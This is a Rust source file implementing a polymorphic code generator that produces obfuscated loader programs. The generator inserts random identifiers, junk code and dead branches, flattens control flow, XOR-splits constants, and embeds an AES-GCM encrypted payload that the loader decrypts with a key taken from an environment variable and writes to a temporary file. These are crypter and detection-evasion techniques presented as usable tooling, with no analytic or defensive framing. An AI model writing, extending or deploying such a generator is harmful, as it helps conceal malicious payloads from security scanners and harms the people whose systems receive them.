use rand::{Rng, SeedableRng, seq::SliceRandom};
use rand::rngs::StdRng;
pub struct PolymorphicGenerator {
    rng: StdRng,
}
impl PolymorphicGenerator {
    pub fn new() -> Self {
        Self {
            rng: StdRng::from_entropy(),
        }
    }
    pub fn gen_var_name(&mut self) -> String {
        let prefixes = [
            "var",
            "val",
            "tmp",
            "buf",
            "data",
            "ptr",
            "ref",
            "obj",
            "item",
            "elem",
        ];
        let prefix = prefixes.choose(&mut self.rng).unwrap();
        format!("{}_{:08x}", prefix, self.rng.gen::< u32 > ())
    }
    pub fn gen_func_name(&mut self) -> String {
        let prefixes = ["func", "proc", "exec", "call", "invoke", "run", "handle"];
        let prefix = prefixes.choose(&mut self.rng).unwrap();
        format!("{}_{:08x}", prefix, self.rng.gen::< u32 > ())
    }
    pub fn gen_junk_code(&mut self) -> String {
        let templates = vec![
            "let {var} = {val}u64.wrapping_mul({val2}u64);",
            "if {val} > {val2} {{ std::hint::black_box({val}); }}",
            "for _ in 0..{small} {{ std::hint::black_box({val}); }}",
            "let {var} = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();",
            "let {var} = ({val} as f64).sqrt().floor() as u64;",
            "std::hint::black_box({val}.wrapping_add({val2}));",
            "let {var} = vec![{val}; {small}].iter().sum::<u64>();",
        ];
        let template = templates.choose(&mut self.rng).unwrap();
        template
            .replace("{var}", &self.gen_var_name())
            .replace("{val}", &self.rng.gen_range(1000..9999).to_string())
            .replace("{val2}", &self.rng.gen_range(100..999).to_string())
            .replace("{small}", &self.rng.gen_range(1..5).to_string())
    }
    pub fn gen_dead_code_branch(&mut self) -> String {
        format!(
            "if {} > {} {{ {} }}", self.rng.gen::< u32 > (), u32::MAX - 1, self
            .gen_junk_code()
        )
    }
    pub fn flatten_control_flow(&mut self, code: &str) -> String {
        let state_var = self.gen_var_name();
        let mut states = vec![0, 1, 2];
        states.shuffle(&mut self.rng);
        format!(
            r#"
            let mut {state_var} = {init};
            loop {{
                match {state_var} {{
                    {s0} => {{
                        {junk1}
                        {state_var} = {s1};
                    }}
                    {s1} => {{
                        {code}
                        {state_var} = {s2};
                    }}
                    {s2} => {{
                        {junk2}
                        break;
                    }}
                    _ => {{ 
                        unsafe {{ 
                            std::ptr::write_volatile(0 as *mut i32, 42); 
                        }}
                    }}
                }}
            }}
            "#,
            state_var = state_var, init = states[0], s0 = states[0], s1 = states[1], s2 =
            states[2], junk1 = self.gen_junk_code(), junk2 = self.gen_junk_code(), code =
            code
        )
    }
    pub fn obfuscate_constants(&mut self, value: &[u8]) -> String {
        let part1: Vec<u8> = value.iter().map(|&b| b ^ 0xAA).collect();
        let part2: Vec<u8> = value.iter().map(|&b| b ^ 0x55).collect();
        format!(
            r#"
            {{
                let p1 = vec!{:?};
                let p2 = vec!{:?};
                p1.iter().zip(p2.iter())
                    .map(|(&a, &b)| (a ^ 0xAA) ^ (b ^ 0x55))
                    .collect::<Vec<u8>>()
            }}
            "#,
            part1, part2
        )
    }
    pub fn generate_polymorphic_loader(
        &mut self,
        enc: &[u8],
        nonce: &[u8],
        salt: &[u8],
    ) -> String {
        let enc_var = self.gen_var_name();
        let nonce_var = self.gen_var_name();
        let salt_var = self.gen_var_name();
        let key_var = self.gen_var_name();
        let cipher_var = self.gen_var_name();
        let mut blocks = vec![
            self.gen_junk_code(),
            format!("let {} = env::var(\"PROTECT_KEY\").expect(\"missing key\");",
            key_var), self.gen_junk_code(),
        ];
        blocks.shuffle(&mut self.rng);
        let dead_branches: String = (0..self.rng.gen_range(2..5))
            .map(|_| {
                format!(
                    "if {} > {} {{ {} }}", self.rng.gen::< u32 > (), u32::MAX - 1, self
                    .gen_junk_code()
                )
            })
            .collect::<Vec<_>>()
            .join("\n");
        let random_suffix = self.rng.gen::<u32>();
        let decrypt_logic_inner = format!(
            r#"
            let mut hasher = Sha256::new();
            hasher.update({}.as_bytes());
            hasher.update({});
            let derived = hasher.finalize();
            let {} = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&derived));
            let dec = {}.decrypt(Nonce::from_slice({}), {}).expect("failed");
            let tmp = env::temp_dir().join("tmp_{:x}");
            fs::write(&tmp, &dec).expect("write failed");
            "#,
            key_var, salt_var, cipher_var, cipher_var, nonce_var, enc_var, random_suffix
        );
        let decrypt_logic = self.flatten_control_flow(&decrypt_logic_inner);
        format!(
            r#"
            use aes_gcm::*;
            use sha2::*;
            use std::{{env, fs, process}};
            
            const {enc_var}: &[u8] = &{enc:?};
            const {nonce_var}: &[u8] = &{nonce:?};
            const {salt_var}: &[u8] = &{salt:?};
            
            fn main() {{
                {junk_start}
                {blocks}
                {dead_branches}
                
                {decrypt_logic}
                
                {junk_end}
            }}
            "#,
            enc_var = enc_var, nonce_var = nonce_var, salt_var = salt_var, enc = enc,
            nonce = nonce, salt = salt, junk_start = self.gen_junk_code(), blocks =
            blocks.join("\n"), dead_branches = dead_branches, decrypt_logic =
            decrypt_logic, junk_end = self.gen_junk_code(),
        )
    }
}